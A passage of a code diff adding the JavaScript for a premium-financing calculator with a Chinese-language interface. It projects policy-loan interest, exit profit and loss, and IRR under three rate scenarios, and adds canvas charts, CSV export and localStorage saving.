+    els.loanRatioInput.value = formatInputNumber(state.loanRatio, 2);
+  }
+  if (!options.keepLoanAmountInput) {
+    els.loanAmountInput.value = formatInputNumber(usdToDisplay(state.loanAmountUsd), 0);
+  }
+  if (!options.keepInvestedCapitalInput) {
+    els.investedCapitalInput.value = formatInputNumber(usdToDisplay(state.investedCapitalUsd), 0);
+  }
+
+  els.yearsInput.value = String(state.years);
+  if (!options.keepFixedRateInputs) {
+    els.fixedLowInput.value = formatInputNumber(state.fixedRates.low, 2);
+    els.fixedBaseInput.value = formatInputNumber(state.fixedRates.base, 2);
+    els.fixedHighInput.value = formatInputNumber(state.fixedRates.high, 2);
+  }
+}
+
+function renderRateMode() {
+  els.yearlyModeBtn.classList.toggle("active", state.rateMode === "yearly");
+  els.fixedModeBtn.classList.toggle("active", state.rateMode === "fixed");
+  els.rateModeLabel.textContent = state.rateMode === "fixed" ? "固定年利率" : "逐年浮動息率";
+  els.assumptionHint.textContent = state.rateMode === "fixed" ? "固定模式會鎖定逐年息率欄位" : "低息率、基本息率和高息率可逐年輸入";
+}
+
+function renderChartRangeInputs() {
+  SCENARIOS.forEach((scenario) => {
+    const range = state.chartRanges[scenario.key];
+    const inputs = els.rangeInputs[scenario.key];
+    inputs.start.max = String(state.years);
+    inputs.end.max = String(state.years);
+    inputs.start.value = String(range.start);
+    inputs.end.value = String(range.end);
+  });
+}
+
+function renderAssumptionTable() {
+  const effectiveRates = getEffectiveRates();
+  const disabled = state.rateMode === "fixed" ? "disabled" : "";
+  const rows = [];
+
+  for (let index = 0; index < state.years; index += 1) {
+    rows.push(`
+      <tr>
+        <td>第 ${index + 1} 年</td>
+        <td>
+          <input type="number" inputmode="decimal" min="0" step="1000"
+            data-kind="policy" data-index="${index}"
+            value="${escapeAttr(formatInputNumber(usdToDisplay(state.policyValuesUsd[index]), 0))}">
+        </td>
+        <td>
+          <input type="text" inputmode="decimal"
+            data-kind="rate" data-scenario="low" data-index="${index}" ${disabled}
+            value="${escapeAttr(formatInputNumber(effectiveRates.low[index], 2))}">
+        </td>
+        <td>
+          <input type="text" inputmode="decimal"
+            data-kind="rate" data-scenario="base" data-index="${index}" ${disabled}
+            value="${escapeAttr(formatInputNumber(effectiveRates.base[index], 2))}">
+        </td>
+        <td>
+          <input type="text" inputmode="decimal"
+            data-kind="rate" data-scenario="high" data-index="${index}" ${disabled}
+            value="${escapeAttr(formatInputNumber(effectiveRates.high[index], 2))}">
+        </td>
+      </tr>
+    `);
+  }
+
+  els.assumptionBody.innerHTML = rows.join("");
+}
+
+function renderOutputsAndSave() {
+  normalizeState();
+  const projection = calculateProjection();
+  renderSummary(projection);
+  renderResultsTable(projection);
+  drawCharts(projection);
+  saveState();
+}
+
+function renderSummary(projection) {
+  const cards = SCENARIOS.map((scenario) => {
+    const data = projection.scenarios[scenario.key];
+    const finalRow = data.rows[data.rows.length - 1] || createEmptyRow();
+    const pnlClass = finalRow.exitPnlUsd >= 0 ? "positive" : "negative";
+    const breakEven = data.breakEvenYear ? `第 ${data.breakEvenYear} 年` : "未達";
+
+    return `
+      <article class="summary-card ${scenario.className}">
+        <p class="scenario-name">${scenario.label}</p>
+        <p class="summary-value ${pnlClass}">${formatMoney(finalRow.exitPnlUsd)}</p>
+        <div class="summary-metrics">
+          <div>
+            <span>投入資金</span>
+            <strong>${formatMoney(state.investedCapitalUsd)}</strong>
+          </div>
+          <div>
+            <span>融資金額</span>
+            <strong>${formatMoney(state.loanAmountUsd)}</strong>
+          </div>
+          <div>
+            <span>累計利息</span>
+            <strong>${formatMoney(data.cumulativeInterestUsd)}</strong>
+          </div>
+          <div>
+            <span>損益平衡</span>
+            <strong>${breakEven}</strong>
+          </div>
+          <div>
+            <span>期末獲利</span>
+            <strong>${formatMoney(finalRow.grossProfitUsd)}</strong>
+          </div>
+          <div>
+            <span>平均年回報</span>
+            <strong>${formatPercent(finalRow.averageAnnualReturnPercent)}</strong>
+          </div>
+          <div>
+            <span>期末 IRR</span>
+            <strong>${formatPercent(finalRow.irrPercent)}</strong>
+          </div>
+        </div>
+      </article>
+    `;
+  });
+
+  els.summaryGrid.innerHTML = cards.join("");
+}
+
+function renderResultsTable(projection) {
+  const tables = SCENARIOS.map((scenario) => {
+    const rows = projection.scenarios[scenario.key].rows.map((row) => {
+      const pnlClass = row.exitPnlUsd >= 0 ? "positive" : "negative";
+      return `
+        <tr>
+          <td>第 ${row.year} 年</td>
+          <td>${formatInputNumber(row.ratePercent, 2)}%</td>
+          <td>${formatMoney(row.policyValueUsd)}</td>
+          <td>${formatMoney(row.principalUsd)}</td>
+          <td>${formatMoney(row.cumulativeInterestUsd)}</td>
+          <td>${formatMoney(row.averageMonthlyInterestUsd)}</td>
+          <td class="${row.grossProfitUsd >= 0 ? "positive" : "negative"}">${formatMoney(row.grossProfitUsd)}</td>
+          <td>${formatMoney(state.investedCapitalUsd)}</td>
+          <td class="${pnlClass}">${formatMoney(row.exitPnlUsd)}</td>
+          <td>${formatPercent(row.averageAnnualReturnPercent)}</td>
+          <td>${formatPercent(row.irrPercent)}</td>
+        </tr>
+      `;
+    }).join("");
+
+    return `
+      <article class="scenario-result ${scenario.className}">
+        <div class="scenario-result-title">
+          <h3>${scenario.label}</h3>
+          <span>共 ${state.years} 年</span>
+        </div>
+        <div class="table-scroll">
+          <table>
+            <thead>
+              <tr>
+                <th>年度</th>
+                <th>利率</th>
+                <th>保單價值</th>
+                <th>融資金額</th>
+                <th>累計利息</th>
+                <th>平均月利息</th>
+                <th>獲利</th>
+                <th>投入資金</th>
+                <th>退出損益</th>
+                <th>平均年回報</th>
+                <th>IRR</th>
+              </tr>
+            </thead>
+            <tbody>${rows}</tbody>
+          </table>
+        </div>
+      </article>
+    `;
+  });
+
+  els.resultsTables.innerHTML = tables.join("");
+}
+
+function recalculateLinkedAmounts(source) {
+  if (source === "loanRatio" || source === "firstDaySurrender") {
+    state.loanAmountUsd = state.firstDaySurrenderUsd * state.loanRatio / 100;
+    state.investedCapitalUsd = calculateInvestedCapital();
+    return;
+  }
+
+  if (source === "loanAmount") {
+    state.loanRatio = state.firstDaySurrenderUsd > 0 ? state.loanAmountUsd / state.firstDaySurrenderUsd * 100 : 0;
+    state.loanRatio = Math.max(0, state.loanRatio);
+    state.investedCapitalUsd = calculateInvestedCapital();
+    return;
+  }
+
+  if (source === "investedCapital") {
+    const discountAmountUsd = calculateDiscountAmount();
+    state.loanAmountUsd = Math.max(0, state.policyPriceUsd - discountAmountUsd - state.investedCapitalUsd);
+    state.loanRatio = state.firstDaySurrenderUsd > 0 ? state.loanAmountUsd / state.firstDaySurrenderUsd * 100 : 0;
+    state.loanRatio = Math.max(0, state.loanRatio);
+    return;
+  }
+
+  state.investedCapitalUsd = calculateInvestedCapital();
+}
+
+function calculateInvestedCapital() {
+  return state.policyPriceUsd - state.loanAmountUsd - calculateDiscountAmount();
+}
+
+function calculateDiscountAmount() {
+  return state.policyPriceUsd * state.discountPercent / 100;
+}
+
+function calculateProjection() {
+  const effectiveRates = getEffectiveRates();
+  const projection = { scenarios: {} };
+
+  SCENARIOS.forEach((scenario) => {
+    let cumulativeInterestUsd = 0;
+    let breakEvenYear = null;
+    const rows = [];
+
+    for (let index = 0; index < state.years; index += 1) {
+      const year = index + 1;
+      const ratePercent = effectiveRates[scenario.key][index] || 0;
+      const annualInterestUsd = state.loanAmountUsd * ratePercent / 100;
+      cumulativeInterestUsd += annualInterestUsd;
+      const averageMonthlyInterestUsd = cumulativeInterestUsd / (year * 12);
+      const policyValueUsd = state.policyValuesUsd[index] || 0;
+      const principalUsd = state.loanAmountUsd;
+      const grossProfitUsd = policyValueUsd - principalUsd - cumulativeInterestUsd;
+      const netSurrenderUsd = policyValueUsd - principalUsd;
+      const exitPnlUsd = netSurrenderUsd - state.investedCapitalUsd - cumulativeInterestUsd;
+      const averageAnnualReturnPercent = calculateAverageAnnualReturnPercent(exitPnlUsd, year);
+      const cashFlows = buildCashFlowsForExit(effectiveRates[scenario.key], index, netSurrenderUsd);
+      const irrPercent = calculateIrrPercent(cashFlows);
+
+      if (breakEvenYear === null && exitPnlUsd >= 0) {
+        breakEvenYear = year;
+      }
+
+      rows.push({
+        year,
+        ratePercent,
+        policyValueUsd,
+        principalUsd,
+        annualInterestUsd,
+        cumulativeInterestUsd,
+        averageMonthlyInterestUsd,
+        grossProfitUsd,
+        netSurrenderUsd,
+        exitPnlUsd,
+        averageAnnualReturnPercent,
+        irrPercent
+      });
+    }
+
+    projection.scenarios[scenario.key] = {
+      rows,
+      cumulativeInterestUsd,
+      breakEvenYear
+    };
+  });
+
+  return projection;
+}
+
+function calculateAverageAnnualReturnPercent(exitPnlUsd, year) {
+  if (state.investedCapitalUsd <= 0 || year <= 0) {
+    return null;
+  }
+  return exitPnlUsd / state.investedCapitalUsd / year * 100;
+}
+
+function buildCashFlowsForExit(rates, exitIndex, netSurrenderUsd) {
+  const flows = [-state.investedCapitalUsd];
+
+  for (let index = 0; index <= exitIndex; index += 1) {
+    const interestUsd = state.loanAmountUsd * (rates[index] || 0) / 100;
+    if (index === exitIndex) {
+      flows.push(netSurrenderUsd - interestUsd);
+    } else {
+      flows.push(-interestUsd);
+    }
+  }
+
+  return flows;
+}
+
+function calculateIrrPercent(cashFlows) {
+  const hasPositive = cashFlows.some((value) => value > 0);
+  const hasNegative = cashFlows.some((value) => value < 0);
+  if (!hasPositive || !hasNegative) {
+    return null;
+  }
+
+  const npv = (rate) => cashFlows.reduce((sum, cashFlow, index) => {
+    return sum + cashFlow / Math.pow(1 + rate, index);
+  }, 0);
+
+  for (let left = -0.95; left < 5; left += 0.05) {
+    let low = left;
+    let high = left + 0.05;
+    let lowValue = npv(low);
+    let highValue = npv(high);
+
+    if (!Number.isFinite(lowValue) || !Number.isFinite(highValue)) {
+      continue;
+    }
+    if (Math.abs(lowValue) < 0.000001) {
+      return low * 100;
+    }
+    if (lowValue * highValue > 0) {
+      continue;
+    }
+
+    for (let step = 0; step < 80; step += 1) {
+      const mid = (low + high) / 2;
+      const midValue = npv(mid);
+      if (Math.abs(midValue) < 0.000001) {
+        return mid * 100;
+      }
+      if (lowValue * midValue <= 0) {
+        high = mid;
+        highValue = midValue;
+      } else {
+        low = mid;
+        lowValue = midValue;
+      }
+    }
+    return (low + high) / 2 * 100;
+  }
+
+  return null;
+}
+
+function drawCharts(projection) {
+  SCENARIOS.forEach((scenario) => {
+    drawScenarioChart(els.chartCanvases[scenario.key], projection.scenarios[scenario.key].rows, scenario);
+  });
+}
+
+function drawScenarioChart(canvas, rows, scenario) {
+  const context = canvas.getContext("2d");
+  const rect = canvas.getBoundingClientRect();
+  const width = Math.max(320, Math.floor(rect.width));
+  const height = 300;
+  const ratio = window.devicePixelRatio || 1;
+
+  canvas.width = width * ratio;
+  canvas.height = height * ratio;
+  context.setTransform(ratio, 0, 0, ratio, 0, 0);
+  context.clearRect(0, 0, width, height);
+
+  const range = state.chartRanges[scenario.key];
+  const visibleRows = rows.slice(range.start - 1, range.end);
+  const padding = { top: 24, right: 18, bottom: 48, left: 78 };
+  const plotWidth = width - padding.left - padding.right;
+  const plotHeight = height - padding.top - padding.bottom;
+
+  const maxPolicy = Math.max(...visibleRows.map((row) => usdToDisplay(row.policyValueUsd)), 1);
+  const maxPositiveStack = Math.max(...visibleRows.map((row) => {
+    const chartProfitUsd = getChartProfitUsd(row);
+    const stackUsd = state.investedCapitalUsd + row.principalUsd + row.cumulativeInterestUsd + Math.max(chartProfitUsd, 0);
+    return usdToDisplay(stackUsd);
+  }), 1);
+  const minProfit = Math.min(...visibleRows.map((row) => usdToDisplay(getChartProfitUsd(row))), 0);
+  const maxValue = Math.max(maxPolicy, maxPositiveStack) * 1.08;
+  const minValue = Math.min(0, minProfit * 1.15);
+  const yForValue = (value) => padding.top + (maxValue - value) / (maxValue - minValue) * plotHeight;
+  const zeroY = yForValue(0);
+
+  context.font = "12px Microsoft JhengHei, Arial";
+  context.lineWidth = 1;
+  context.strokeStyle = "#dbe3dd";
+  context.fillStyle = "#66706b";
+  context.textAlign = "right";
+  context.textBaseline = "middle";
+
+  for (let index = 0; index <= 4; index += 1) {
+    const value = minValue + (maxValue - minValue) * index / 4;
+    const y = yForValue(value);
+    context.beginPath();
+    context.moveTo(padding.left, y);
+    context.lineTo(width - padding.right, y);
+    context.stroke();
+    context.fillText(formatCompactDisplay(value), padding.left - 10, y);
+  }
+
+  context.strokeStyle = "#8d9891";
+  context.beginPath();
+  context.moveTo(padding.left, zeroY);
+  context.lineTo(width - padding.right, zeroY);
+  context.stroke();
+
+  const gap = 10;
+  const barWidth = Math.max(18, Math.min(48, (plotWidth - gap * Math.max(0, visibleRows.length - 1)) / Math.max(visibleRows.length, 1)));
+  const totalBarSpace = barWidth * visibleRows.length + gap * Math.max(0, visibleRows.length - 1);
+  let x = padding.left + Math.max(0, (plotWidth - totalBarSpace) / 2);
+
+  const labelInterval = width < 420 ? Math.ceil(visibleRows.length / 5) : width < 560 ? Math.ceil(visibleRows.length / 7) : 1;
+
+  visibleRows.forEach((row, rowIndex) => {
+    const investedDisplay = usdToDisplay(state.investedCapitalUsd);
+    const principalDisplay = usdToDisplay(row.principalUsd);
+    const interestDisplay = usdToDisplay(row.cumulativeInterestUsd);
+    const profitDisplay = usdToDisplay(getChartProfitUsd(row));
+    let stackTop = 0;
+
+    drawPositiveSegment(context, x, barWidth, yForValue, stackTop, investedDisplay, "#6c7f91");
+    stackTop += investedDisplay;
+    drawPositiveSegment(context, x, barWidth, yForValue, stackTop, principalDisplay, "#263b55");
+    stackTop += principalDisplay;
+    drawPositiveSegment(context, x, barWidth, yForValue, stackTop, interestDisplay, "#c07a2a");
+    stackTop += interestDisplay;
+
+    if (profitDisplay >= 0) {
+      drawPositiveSegment(context, x, barWidth, yForValue, stackTop, profitDisplay, "#2f8b6d");
+    } else {
+      drawNegativeSegment(context, x, barWidth, yForValue, 0, profitDisplay, "#b44b4b");
+    }
+
+    context.fillStyle = "#66706b";
+    context.textAlign = "center";
+    context.textBaseline = "top";
+    context.fillText(String(row.year), x + barWidth / 2, height - padding.bottom + 16);
+
+    if (rowIndex % labelInterval === 0 || rowIndex === visibleRows.length - 1) {
+      const labelY = Math.min(yForValue(Math.max(usdToDisplay(row.policyValueUsd), 0)) - 18, zeroY - 18);
+      context.save();
+      context.translate(x + barWidth / 2, Math.max(18, labelY));
+      context.rotate(-Math.PI / 8);
+      context.fillStyle = "#1d2522";
+      context.font = width < 420 ? "10px Microsoft JhengHei, Arial" : "11px Microsoft JhengHei, Arial";
+      context.fillText(formatCompactDisplay(usdToDisplay(row.policyValueUsd)), 0, 0);
+      context.restore();
+    }
+
+    x += barWidth + gap;
+  });
+
+}
+
+function getChartProfitUsd(row) {
+  return row.policyValueUsd - state.investedCapitalUsd - row.principalUsd - row.cumulativeInterestUsd;
+}
+
+function drawPositiveSegment(context, x, width, yForValue, start, amount, color) {
+  if (amount <= 0) {
+    return;
+  }
+  const y1 = yForValue(start);
+  const y2 = yForValue(start + amount);
+  context.fillStyle = color;
+  context.fillRect(x, y2, width, Math.max(1, y1 - y2));
+}
+
+function drawNegativeSegment(context, x, width, yForValue, start, amount, color) {
+  if (amount >= 0) {
+    return;
+  }
+  const y1 = yForValue(start);
+  const y2 = yForValue(start + amount);
+  context.fillStyle = color;
+  context.fillRect(x, y1, width, Math.max(1, y2 - y1));
+}
+
+function drawLegend(context, x, y, items) {
+  let cursor = x;
+  items.forEach(([label, color]) => {
+    context.fillStyle = color;
+    context.fillRect(cursor, y, 10, 10);
+    context.fillStyle = "#1d2522";
+    context.textAlign = "left";
+    context.textBaseline = "middle";
+    context.font = "12px Microsoft JhengHei, Arial";
+    context.fillText(label, cursor + 14, y + 5);
+    cursor += Math.max(62, context.measureText(label).width + 28);
+  });
+}
+
+function exportCsv() {
+  const projection = calculateProjection();
+  const currency = state.currency;
+  const rows = [
+    ["保費融資計算機"],
+    ["顯示貨幣", currency],
+    ["USD/HKD 匯率", state.exchangeRate],
+    ["保單價值", displayRaw(state.policyPriceUsd)],
+    ["首日退保價格", displayRaw(state.firstDaySurrenderUsd)],
+    ["優惠", `${formatInputNumber(state.discountPercent, 2)}%`],
+    ["優惠金額", displayRaw(calculateDiscountAmount())],
+    ["融資比例", `${formatInputNumber(state.loanRatio, 2)}%`],
+    ["融資金額", displayRaw(state.loanAmountUsd)],
+    ["投入資金", displayRaw(state.investedCapitalUsd)],
+    ["利率模式", state.rateMode === "fixed" ? "固定年利率" : "逐年浮動息率"],
+    [],
+    ["年度", "情境", "利率", `保單價值 (${currency})`, `融資金額 (${currency})`, `累計利息 (${currency})`, `平均月利息 (${currency})`, `獲利 (${currency})`, `投入資金 (${currency})`, `退出損益 (${currency})`, "平均年回報", "IRR"]
+  ];
+
+  for (let yearIndex = 0; yearIndex < state.years; yearIndex += 1) {
+    SCENARIOS.forEach((scenario) => {
+      const row = projection.scenarios[scenario.key].rows[yearIndex];
+      rows.push([
+        row.year,
+        scenario.label,
+        `${formatInputNumber(row.ratePercent, 2)}%`,
+        displayRaw(row.policyValueUsd),
+        displayRaw(row.principalUsd),
+        displayRaw(row.cumulativeInterestUsd),
+        displayRaw(row.averageMonthlyInterestUsd),
+        displayRaw(row.grossProfitUsd),
+        displayRaw(state.investedCapitalUsd),
+        displayRaw(row.exitPnlUsd),
+        formatPercent(row.averageAnnualReturnPercent),
+        formatPercent(row.irrPercent)
+      ]);
+    });
+  }
+
+  const csv = rows.map((row) => row.map(csvCell).join(",")).join("\r\n");
+  const blob = new Blob([`\uFEFF${csv}`], { type: "text/csv;charset=utf-8" });
+  const url = URL.createObjectURL(blob);
+  const link = document.createElement("a");
+  link.href = url;
+  link.download = `premium-financing-${currency}-${new Date().toISOString().slice(0, 10)}.csv`;
+  document.body.appendChild(link);
+  link.click();
+  link.remove();
+  URL.revokeObjectURL(url);
+}
+
+function getEffectiveRates() {
+  if (state.rateMode === "fixed") {
+    return {
+      low: Array.from({ length: state.years }, () => state.fixedRates.low),
+      base: Array.from({ length: state.years }, () => state.fixedRates.base),
+      high: Array.from({ length: state.years }, () => state.fixedRates.high)
+    };
+  }
+
+  return {
+    low: state.scenarioRates.low.slice(0, state.years),
+    base: state.scenarioRates.base.slice(0, state.years),
+    high: state.scenarioRates.high.slice(0, state.years)
+  };
+}
+
+function resizeProjectionArrays() {
+  state.policyValuesUsd = resizeNumberArray(state.policyValuesUsd, state.years, (index) => {
+    if (index === 0) {
+      return state.policyPriceUsd * 0.94;
+    }
+    const previous = state.policyValuesUsd[index - 1] || state.policyPriceUsd;
+    return previous * 1.035;
+  });
+
+  SCENARIOS.forEach((scenario) => {
+    const fallback = state.fixedRates[scenario.key] || 0;
+    state.scenarioRates[scenario.key] = resizeNumberArray(state.scenarioRates[scenario.key], state.years, () => fallback);
+  });
+}
+
+function resizeNumberArray(array, length, fallbackFactory) {
+  const next = Array.isArray(array) ? array.slice(0, length) : [];
+  while (next.length < length) {
+    next.push(Number(fallbackFactory(next.length)) || 0);
+  }
+  return next;
+}
+
+function normalizeChartRanges() {
+  state.chartRanges = state.chartRanges || {};
+  SCENARIOS.forEach((scenario) => {
+    const existing = state.chartRanges[scenario.key] || {};
+    const defaultEnd = Math.min(state.years, 10);
+    let start = clamp(Math.round(Number(existing.start) || 1), 1, state.years);
+    let end = clamp(Math.round(Number(existing.end) || defaultEnd), 1, state.years);
+    if (start > end) {
+      [start, end] = [end, start];
+    }
+    state.chartRanges[scenario.key] = { start, end };
+  });
+}
+
+function loadState() {
+  try {
+    const stored = window.localStorage.getItem(STORAGE_KEY);
+    if (stored) {
+      return normalizeLoadedState(JSON.parse(stored));
+    }
+  } catch (error) {
+    console.warn("Unable to load saved calculator state.", error);
+  }
+  return createSampleState();
+}
+
+function saveState() {
+  try {
+    window.localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
+    els.saveStatus.textContent = "已保存";
+  } catch (error) {
+    els.saveStatus.textContent = "未保存";
+  }
+}
+
+function normalizeLoadedState(value) {
+  const sample = createSampleState();
+  return {
+    ...sample,
+    ...value,
+    fixedRates: { ...sample.fixedRates, ...(value.fixedRates || {}) },
+    chartRanges: { ...sample.chartRanges, ...(value.chartRanges || {}) },
+    scenarioRates: {
+      low: value.scenarioRates?.low || sample.scenarioRates.low,
+      base: value.scenarioRates?.base || sample.scenarioRates.base,
+      high: value.scenarioRates?.high || sample.scenarioRates.high
+    },
+    policyValuesUsd: value.policyValuesUsd || sample.policyValuesUsd
+  };
+}
+
+function normalizeState() {
+  state.currency = state.currency === "HKD" ? "HKD" : "USD";
+  state.exchangeRate = Number(state.exchangeRate) > 0 ? Number(state.exchangeRate) : 7.8;
+  state.years = clamp(Math.round(Number(state.years) || 20), 1, 40);
+  state.policyPriceUsd = Math.max(0, Number(state.policyPriceUsd) || 0);
+  state.firstDaySurrenderUsd = Math.max(0, Number(state.firstDaySurrenderUsd) || 0);
+  state.discountPercent = clamp(Number(state.discountPercent) || 0, 0, 100);
+  state.loanRatio = Math.max(0, Number(state.loanRatio) || 0);
+  state.loanAmountUsd = Math.max(0, Number(state.loanAmountUsd) || 0);
+  state.investedCapitalUsd = Number(state.investedCapitalUsd);
+  if (!Number.isFinite(state.investedCapitalUsd)) {
+    state.investedCapitalUsd = calculateInvestedCapital();
+  }
+  state.rateMode = state.rateMode === "fixed" ? "fixed" : "yearly";
+  state.fixedRates = state.fixedRates || { low: 4.5, base: 5.5, high: 7 };
+  state.scenarioRates = state.scenarioRates || { low: [], base: [], high: [] };
+  state.policyValuesUsd = Array.isArray(state.policyValuesUsd) ? state.policyValuesUsd.map((value) => Math.max(0, Number(value) || 0)) : [];
+
+  SCENARIOS.forEach((scenario) => {
+    state.fixedRates[scenario.key] = clamp(Number(state.fixedRates[scenario.key]) || 0, 0, 100);
+    state.scenarioRates[scenario.key] = Array.isArray(state.scenarioRates[scenario.key])
+      ? state.scenarioRates[scenario.key].map((value) => clamp(Number(value) || 0, 0, 100))
+      : [];
+  });
+
+  resizeProjectionArrays();
+  normalizeChartRanges();
+}
+
+function createSampleState() {
+  const years = 20;
+  const policyPriceUsd = 1000000;
+  const firstDaySurrenderUsd = 880000;
+  const loanRatio = 70;
+  const loanAmountUsd = firstDaySurrenderUsd * loanRatio / 100;
+  const discountPercent = 5;
+  const investedCapitalUsd = policyPriceUsd - loanAmountUsd - policyPriceUsd * discountPercent / 100;
+
+  const policyValuesUsd = Array.from({ length: years }, (_, index) => {
+    const year = index + 1;
+    return Math.round(policyPriceUsd * (0.92 + year * 0.025 + Math.pow(1.026, year) * 0.035));
+  });
+
+  return {
+    currency: "USD",
+    exchangeRate: 7.8,
+    years,
+    policyPriceUsd,
+    firstDaySurrenderUsd,
+    discountPercent,
+    loanRatio,
+    loanAmountUsd,
+    investedCapitalUsd,
+    rateMode: "yearly",
+    fixedRates: {
+      low: 4.5,
+      base: 5.5,
+      high: 7
+    },
+    chartRanges: {
+      low: { start: 1, end: 10 },
+      base: { start: 1, end: 10 },
+      high: { start: 1, end: 10 }
+    },
+    policyValuesUsd,
+    scenarioRates: {
+      low: Array.from({ length: years }, (_, index) => roundTo(4.1 + Math.min(index, 8) * 0.04, 2)),
+      base: Array.from({ length: years }, (_, index) => roundTo(5.1 + Math.min(index, 8) * 0.06, 2)),
+      high: Array.from({ length: years }, (_, index) => roundTo(6.6 + Math.min(index, 8) * 0.09, 2))
+    }
+  };
+}
+
+function createBlankState() {
+  const years = 20;
+  return {
+    currency: "USD",
+    exchangeRate: 7.8,
+    years,
+    policyPriceUsd: 0,
+    firstDaySurrenderUsd: 0,
+    discountPercent: 0,
+    loanRatio: 0,
+    loanAmountUsd: 0,
+    investedCapitalUsd: 0,
+    rateMode: "yearly",
+    fixedRates: { low: 0, base: 0, high: 0 },
+    chartRanges: {
+      low: { start: 1, end: 10 },
+      base: { start: 1, end: 10 },
+      high: { start: 1, end: 10 }
+    },
+    policyValuesUsd: Array.from({ length: years }, () => 0),
+    scenarioRates: {
+      low: Array.from({ length: years }, () => 0),
+      base: Array.from({ length: years }, () => 0),
+      high: Array.from({ length: years }, () => 0)
+    }
+  };
+}
+
+function createEmptyRow() {
+  return {
+    exitPnlUsd: 0,
+    grossProfitUsd: 0,
+    averageAnnualReturnPercent: null,
+    irrPercent: null
+  };
+}
+
+function usdToDisplay(valueUsd) {
+  return state.currency === "HKD" ? valueUsd * state.exchangeRate : valueUsd;
+}
+
+function displayToUsd(value) {
+  return state.currency === "HKD" ? value / state.exchangeRate : value;
+}
+
+function formatMoney(valueUsd) {
+  const value = usdToDisplay(valueUsd);
+  const currency = state.currency;
+  const formatted = new Intl.NumberFormat("en-US", {
+    style: "currency",
+    currency,
+    maximumFractionDigits: 0
+  }).format(value);
+  return currency === "HKD" ? formatted.replace("HK$", "HK$ ") : formatted;
+}
+
+function displayRaw(valueUsd) {
+  return roundTo(usdToDisplay(valueUsd), 2);
+}
+
+function formatCompactDisplay(value) {
+  const abs = Math.abs(value);
+  const prefix = value < 0 ? "-" : "";
+  if (abs >= 1000000) {
+    return `${prefix}${state.currency} ${(abs / 1000000).toFixed(1)}M`;
+  }
+  if (abs >= 1000) {
+    return `${prefix}${state.currency} ${(abs / 1000).toFixed(0)}K`;
+  }
+  return `${prefix}${state.currency} ${abs.toFixed(0)}`;
+}
+
+function formatPercent(value) {
+  return value === null || !Number.isFinite(value) ? "N/A" : `${formatInputNumber(value, 2)}%`;
+}
+
+function formatInputNumber(value, decimals) {
+  const numeric = Number(value);
+  if (!Number.isFinite(numeric)) {
+    return "";
+  }
+  const rounded = roundTo(numeric, decimals);
+  return decimals === 0 ? String(Math.round(rounded)) : rounded.toFixed(decimals);
+}
+
+function readNumber(value, fallback) {
+  const parsed = Number(value);
+  return Number.isFinite(parsed) ? parsed : fallback;
+}
+
+function readRateValue(value, fallback) {
+  const text = String(value ?? "")
+    .trim()
+    .replace(/[％%]/g, "")
+    .replace(",", ".");
+  if (text === "" || text === "." || text === "-") {
+    return fallback;
+  }
+  const parsed = Number(text);
+  return Number.isFinite(parsed) ? parsed : fallback;
+}
+
+function roundTo(value, decimals) {
+  const factor = Math.pow(10, decimals);
+  return Math.round((Number(value) || 0) * factor) / factor;
+}
+
+function clamp(value, min, max) {
+  return Math.min(max, Math.max(min, value));
+}
+
+function csvCell(value) {
+  const text = String(value ?? "");
+  if (/[",\r\n]/.test(text)) {
+    return `"${text.replace(/"/g, '""')}"`;
+  }
+  return text;
+}
+
+function escapeAttr(value) {
+  return String(value)
+    .replace(/&/g, "&amp;")
+    .replace(/"/g, "&quot;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
